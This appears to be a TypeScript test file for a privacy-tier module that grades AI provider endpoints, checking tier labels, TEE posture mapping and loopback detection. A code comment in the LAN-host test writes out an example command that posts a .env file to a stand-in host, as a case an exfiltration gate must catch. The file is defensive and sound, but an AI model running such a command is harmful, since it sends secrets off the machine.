import { test } from "node:test";
import assert from "node:assert/strict";
import { TIERS, tierRank, tierFromTeePosture } from "../src/posture/tiers.ts";
import { effectiveTier, isLocalEndpoint, PROVIDER_BY_ID } from "../src/index.ts";

test("only tee-verified is cryptographically verified", () => {
  const crypto = Object.values(TIERS).filter((t) => t.verifiability === "cryptographic");
  assert.deepEqual(crypto.map((t) => t.tier), ["tee-verified"]);
});

test("verified and asserted tiers never share a label", () => {
  const labels = Object.values(TIERS).map((t) => t.label);
  assert.equal(new Set(labels).size, labels.length); // all distinct
  // ZDR tiers must not read as "verified".
  assert.doesNotMatch(TIERS["zdr-policy"].label, /verified/i);
  assert.doesNotMatch(TIERS["zdr-enforced"].label, /verified/i);
});

test("tierRank orders strongest privacy first", () => {
  assert.ok(tierRank("tee-verified") < tierRank("zdr-enforced"));
  assert.ok(tierRank("local") < tierRank("zdr-policy"));
  assert.ok(tierRank("zdr-policy") < tierRank("standard"));
});

test("TeePosture maps onto the ladder", () => {
  assert.equal(tierFromTeePosture("green"), "tee-verified");
  assert.equal(tierFromTeePosture("yellow"), "tee-unverified");
  assert.equal(tierFromTeePosture("red"), "standard");
});

test("isLocalEndpoint detects loopback", () => {
  assert.equal(isLocalEndpoint("http://localhost:11434/v1"), true);
  assert.equal(isLocalEndpoint("http://127.0.0.1:1234/v1"), true);
  assert.equal(isLocalEndpoint("https://api.openai.com/v1"), false);
});

test("isLocalEndpoint covers the whole loopback space, not just 127.0.0.1", () => {
  assert.equal(isLocalEndpoint("http://[::1]:11434/v1"), true, "IPv6 literal (URL.hostname keeps the brackets)");
  assert.equal(isLocalEndpoint("http://127.0.0.2:1234"), true, "all of 127.0.0.0/8");
  assert.equal(isLocalEndpoint("http://127.255.255.254:1"), true);
  assert.equal(isLocalEndpoint("http://0.0.0.0:8080"), true);
  assert.equal(isLocalEndpoint("http://[::ffff:127.0.0.1]:1"), true, "IPv4-mapped IPv6");
  assert.equal(isLocalEndpoint("http://sub.localhost:1"), true, "RFC 6761 localhost subdomain");
});

test("isLocalEndpoint rejects LAN hosts — they are NOT on-device", () => {
  // The whole thesis: `.local` is mDNS, i.e. a DIFFERENT machine on the network.
  // Grading it on-device would hand a green badge to a remote host AND exempt it
  // from the exfil gate (`curl -d @.env http://drop.local/`).
  assert.equal(isLocalEndpoint("http://nas.local:8080/v1"), false);
  assert.equal(isLocalEndpoint("http://drop.local/collect"), false);
  assert.equal(isLocalEndpoint("http://192.168.1.50:8080"), false, "RFC1918 is still another host");
  assert.equal(isLocalEndpoint("http://10.0.0.9:8080"), false);
  assert.equal(isLocalEndpoint("http://localhost.attacker.com/v1"), false, "prefix, not suffix");
  assert.equal(isLocalEndpoint("http://999.0.0.1/"), false, "not a valid v4 address");
  assert.equal(isLocalEndpoint("not a url"), false);
});

test("effectiveTier: a LAN endpoint never grades as on-device", () => {
  assert.equal(effectiveTier("custom", { baseUrl: "http://nas.local:8080/v1" }), "standard");
  assert.equal(effectiveTier("custom", { baseUrl: "http://[::1]:8080/v1" }), "local");
});

test("effectiveTier: openrouter is posture-aware", () => {
  assert.equal(effectiveTier("openrouter"), "zdr-policy");
  assert.equal(effectiveTier("openrouter", { zdrEnforced: true }), "zdr-enforced");
});

test("effectiveTier: custom on a loopback url becomes local", () => {
  assert.equal(effectiveTier("custom"), "standard");
  assert.equal(effectiveTier("custom", { baseUrl: "http://localhost:1234/v1" }), "local");
});

test("effectiveTier: TEE providers advertise their ceiling pre-attestation", () => {
  assert.equal(effectiveTier("tinfoil"), "tee-verified");
  assert.equal(effectiveTier("nearai"), "tee-verified");
  assert.ok(PROVIDER_BY_ID["tinfoil"].attestable);
  assert.ok(PROVIDER_BY_ID["nearai"].attestable);
});

test("unknown provider is standard", () => {
  assert.equal(effectiveTier("groq"), "standard");
});
